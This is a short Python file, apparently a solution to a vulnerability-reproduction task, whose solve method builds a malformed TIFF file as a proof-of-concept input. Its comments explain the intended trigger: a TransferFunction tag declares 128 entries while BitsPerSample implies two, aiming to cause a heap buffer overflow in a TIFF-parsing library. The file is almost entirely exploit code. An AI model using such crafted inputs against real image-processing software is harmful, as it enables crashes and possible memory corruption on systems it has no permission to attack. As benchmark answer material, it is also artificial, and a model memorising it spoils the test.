import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a TIFF file (Little Endian)
        # Header: "II" (0x4949), Version 42 (0x002A), Offset to first IFD 8
        poc = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
        
        # Directory Entries
        entries = []
        
        # Tag 256 (ImageWidth): SHORT, Count 1, Value 16
        entries.append(struct.pack('<HHII', 256, 3, 1, 16))
        
        # Tag 257 (ImageLength): SHORT, Count 1, Value 16
        entries.append(struct.pack('<HHII', 257, 3, 1, 16))
        
        # Tag 258 (BitsPerSample): SHORT, Count 1, Value 1
        # This implies a TransferFunction table size of 1<<1 = 2 entries
        entries.append(struct.pack('<HHII', 258, 3, 1, 1))
        
        # Tag 259 (Compression): SHORT, Count 1, Value 1 (None)
        entries.append(struct.pack('<HHII', 259, 3, 1, 1))
        
        # Tag 262 (PhotometricInterpretation): SHORT, Count 1, Value 1 (BlackIsZero)
        entries.append(struct.pack('<HHII', 262, 3, 1, 1))
        
        # Tag 273 (StripOffsets): LONG, Count 1, Value 8 (Points to header)
        entries.append(struct.pack('<HHII', 273, 4, 1, 8))
        
        # Tag 277 (SamplesPerPixel): SHORT, Count 1, Value 1
        entries.append(struct.pack('<HHII', 277, 3, 1, 1))
        
        # Tag 278 (RowsPerStrip): LONG, Count 1, Value 16
        entries.append(struct.pack('<HHII', 278, 4, 1, 16))
        
        # Tag 279 (StripByteCounts): LONG, Count 1, Value 1
        entries.append(struct.pack('<HHII', 279, 4, 1, 1))
        
        # Tag 301 (TransferFunction): SHORT, Count 128, Offset 0
        # Vulnerability Trigger:
        # - Tag is "offline" because size (128 * 2 = 256 bytes) > 4 bytes.
        # - Offset 0 points to start of file (valid readable memory).
        # - The library expects 2 entries (based on BPS=1) but the tag claims 128 entries.
        # - If the library allocates based on expected size (4 bytes) but loops based on tag count (128),
        #   it will write 256 bytes into a 4-byte buffer, causing a Heap Buffer Overflow.
        entries.append(struct.pack('<HHII', 301, 3, 128, 0))
        
        # Write IFD Entry Count
        poc += struct.pack('<H', len(entries))
        
        # Write Entries
        for entry in entries:
            poc += entry
            
        # Next IFD Offset (0)
        poc += struct.pack('<I', 0)
        
        return bytes(poc)